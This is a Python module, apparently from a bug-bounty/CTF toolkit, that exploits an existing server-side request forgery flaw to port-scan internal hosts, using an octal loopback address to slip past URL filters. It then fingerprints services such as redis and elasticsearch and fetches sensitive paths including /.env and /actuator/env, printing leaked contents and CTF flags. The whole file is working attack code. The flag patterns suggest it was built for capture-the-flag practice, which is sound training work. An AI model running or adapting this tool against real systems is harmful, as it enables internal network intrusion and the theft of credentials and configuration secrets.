"""SSRF pivot module — port scan and exploit internal services via SSRF.

Uses an existing SSRF vulnerability to:
1. Port scan internal services (localhost, private IPs)
2. Fingerprint discovered services (redis, elasticsearch, mysql, http, ...)
3. Exploit internal web apps found through SSRF
4. Chain redirects to bypass URL filters

Usage:
    from bugbounty_ctf.ssrf_pivot import SSRFPivot

    pivot = SSRFPivot(scanner, ssrf_url="http://target/fetch", param_name="url")
    open_ports = pivot.port_scan("0177.0.0.1", ports=[80, 5000, 9090, 3000, 8000])
    services = pivot.fingerprint_services(open_ports)
    flags = pivot.exploit_internal_services(services)
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, ClassVar, TypeGuard

from bugbounty_ctf.engine import SecurityScanner

FLAG_PATTERNS = [
    r"HTB\{[^}]+\}",
    r"flag\{[^}]+\}",
    r"CTF\{[^}]+\}",
    r"pwn\{[^}]+\}",
]


@dataclass
class InternalService:
    """A service discovered via SSRF port scan."""

    host: str
    port: int
    status: str = "unknown"
    content_length: int = 0
    content_preview: str = ""
    service_name: str = "unknown"
    version: str = ""
    tech_hints: list[str] = field(default_factory=list)
    endpoints: list[str] = field(default_factory=list)
    flags: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "host": self.host,
            "port": self.port,
            "status": self.status,
            "content_length": self.content_length,
            "content_preview": self.content_preview[:200],
            "service_name": self.service_name,
            "version": self.version,
            "tech_hints": self.tech_hints,
            "endpoints": self.endpoints,
            "flags": self.flags,
        }


class SSRFPivot:
    """Use SSRF to scan and exploit internal services.

    Requires an existing SSRF vulnerability (e.g., a URL fetcher endpoint).
    Uses the scanner's SSRF to probe internal ports and services.
    """

    DEFAULT_PORTS: ClassVar[list[int]] = [
        21, 22, 25, 80, 443, 445, 1433, 1521, 2375, 2376, 3000, 3306, 4000,
        5000, 5432, 5601, 5985, 6379, 8000, 8080, 8443, 9000, 9090, 9091,
        9200, 9300, 11211, 27017,
    ]

    COMMON_PATHS: ClassVar[list[str]] = [
        "/", "/admin", "/api", "/api/v1", "/api/v1/health", "/health", "/status",
        "/info", "/config", "/env", "/debug", "/metrics", "/.env", "/flag",
        "/flag.txt", "/console", "/actuator", "/actuator/env", "/swagger",
        "/swagger.json", "/openapi.json", "/v2/_catalog",
    ]

    TECH_HINT_MARKERS: ClassVar[dict[str, str]] = {
        "nginx-ui": "nginx-ui",
        "nginx": "nginx",
        "apache": "apache",
        "flask": "flask",
        "werkzeug": "flask",
        "docker": "docker",
        "kubernetes": "kubernetes",
        "k8s": "kubernetes",
        "jenkins": "jenkins",
        "grafana": "grafana",
        "prometheus": "prometheus",
    }

    def __init__(
        self,
        scanner: SecurityScanner,
        ssrf_url: str,
        param_name: str = "url",
        method: str = "POST",
        url_suffix: str = "",
    ) -> None:
        self.scanner = scanner
        self.ssrf_url = ssrf_url
        self.param_name = param_name
        self.method = method
        self.url_suffix = url_suffix
        self.services: list[InternalService] = []

    def _ssrf_fetch(self, target_url: str) -> str | None:
        """Fetch a URL via the SSRF vulnerability and return the response content."""
        full_url = target_url + self.url_suffix
        is_post = self.method.upper() in ("POST", "PUT", "PATCH")

        try:
            r = self.scanner._make_request(
                self.method,
                self.ssrf_url,
                **(
                    {"data": {self.param_name: full_url}}
                    if is_post
                    else {"params": {self.param_name: full_url}}
                ),
            )

            if r.status_code == 0:
                return None

            pre_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1)
                content = content.replace("&lt;", "<").replace("&gt;", ">")
                content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")
                return content

            err_match = re.search(r"panel err.*?>(.*?)</div>", r.text, re.DOTALL)
            if err_match:
                err_text = err_match.group(1)
                if "Could not fetch" in err_text:
                    return None
                if "Security policy" in err_text:
                    return None
                return f"ERROR: {err_text[:200]}"

            return str(r.text[:500])
        except Exception:
            return None

    def _fetch_or_none(self, target_url: str) -> str | None:
        try:
            return self._ssrf_fetch(target_url)
        except Exception:
            return None

    @staticmethod
    def _is_open_content(content: str | None) -> TypeGuard[str]:
        return bool(content and "Could not fetch" not in content and "Security policy" not in content)

    @staticmethod
    def _is_fingerprint_content(content: str | None) -> TypeGuard[str]:
        return bool(
            content
            and "Not Found" not in content
            and "404" not in content[:20]
            and "301" not in content[:20]
            and "Moved Permanently" not in content[:50]
        )

    @staticmethod
    def _first_match(pattern: str, content: str) -> str:
        match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
        return match.group(1).strip() if match else ""

    @staticmethod
    def _add_hint(service: InternalService, hint: str) -> None:
        if hint not in service.tech_hints:
            service.tech_hints.append(hint)

    @classmethod
    def _apply_banner_metadata(cls, service: InternalService, content: str) -> None:
        lower = content.lower()
        if service.port == 6379 or lower.startswith("-err") or "redis" in lower:
            service.service_name = "redis"
            service.version = cls._first_match(r"redis_version:([^\r\n]+)", content)
        elif service.port in (9200, 9300) or "elasticsearch" in lower:
            service.service_name = "elasticsearch"
            service.version = cls._first_match(r'"number"\s*:\s*"([^"]+)"', content)
        elif service.port == 3306 or "mysql" in lower:
            service.service_name = "mysql"
            service.version = cls._first_match(r"\b(\d+\.\d+(?:\.\d+)?)\b.*mysql", content)
        elif content.startswith("HTTP/") or "<html" in lower or "server:" in lower:
            service.service_name = "http"
            service.version = cls._first_match(r"^server:\s*([^\r\n]+)", content)

        for marker, hint in cls.TECH_HINT_MARKERS.items():
            if marker in lower:
                cls._add_hint(service, hint)

    @staticmethod
    def _update_status(service: InternalService, content: str) -> None:
        lower = content.lower()
        if "404" in content[:100]:
            service.status = "open-404"
        elif "301" in content[:50]:
            service.status = "open-redirect"
        elif "<html" in lower:
            service.status = "open-html"

    def port_scan(
        self,
        host: str = "0177.0.0.1",
        ports: list[int] | None = None,
        timeout: float = 3,
    ) -> list[InternalService]:
        """Scan internal ports via SSRF. Returns list of open services."""
        if ports is None:
            ports = self.DEFAULT_PORTS

        print(f"[*] SSRF port scan on {host} ({len(ports)} ports)")
        open_services: list[InternalService] = []

        for port in ports:
            content = self._fetch_or_none(f"http://{host}:{port}/")

            if self._is_open_content(content):
                service = InternalService(
                    host=host,
                    port=port,
                    status="open",
                    content_length=len(content),
                    content_preview=content[:200],
                )
                self._apply_banner_metadata(service, content)
                self._update_status(service, content)

                open_services.append(service)
                print(f"  [+] {host}:{port} — {service.status} ({service.content_length} bytes)")

        self.services.extend(open_services)
        print(f"[*] Found {len(open_services)} open ports")
        return open_services

    def fingerprint_services(
        self, services: list[InternalService] | None = None
    ) -> list[InternalService]:
        """Fingerprint discovered services by probing common paths."""
        if services is None:
            services = self.services

        print(f"[*] Fingerprinting {len(services)} services")
        for service in services:
            if service.status in ("closed", "error"):
                continue

            print(f"  Fingerprinting {service.host}:{service.port}")
            for path in self.COMMON_PATHS:
                url = f"http://{service.host}:{service.port}{path}"
                content = self._fetch_or_none(url)

                if self._is_fingerprint_content(content):
                    service.endpoints.append(path)
                    self._apply_banner_metadata(service, content)

                    flags = self._extract_flags(content)
                    if flags:
                        service.flags.extend(flags)
                        print(f"    [FLAG] {path}: {flags}")

        return services

    def exploit_internal_services(self, services: list[InternalService] | None = None) -> list[str]:
        """Exploit discovered internal services and extract flags."""
        if services is None:
            services = self.services

        all_flags: list[str] = []

        for service in services:
            if not service.endpoints:
                continue

            print(f"\n[*] Exploiting {service.host}:{service.port}")
            print(f"    Endpoints: {service.endpoints}")

            for endpoint in service.endpoints:
                url = f"http://{service.host}:{service.port}{endpoint}"
                content = self._fetch_or_none(url)

                if content:
                    flags = self._extract_flags(content)
                    if flags:
                        all_flags.extend(flags)
                        service.flags.extend(flags)
                        print(f"    [FLAG] {endpoint}: {flags}")

                    if "/.env" in endpoint and content:
                        print(f"    [!] .env file: {content[:200]}")

                    if "/actuator/env" in endpoint and content:
                        print(f"    [!] Spring Boot actuator env leak: {content[:200]}")

                    if "/api/v1/health" in endpoint:
                        print(f"    [!] Health endpoint: {content[:200]}")

        return all_flags

    @staticmethod
    def _extract_flags(text: str) -> list[str]:
        """Extract flag patterns from text."""
        return [flag for pattern in FLAG_PATTERNS for flag in re.findall(pattern, text, re.IGNORECASE)]

    def get_results(self) -> list[dict[str, Any]]:
        """Return all discovered services as dicts."""
        return [s.to_dict() for s in self.services]
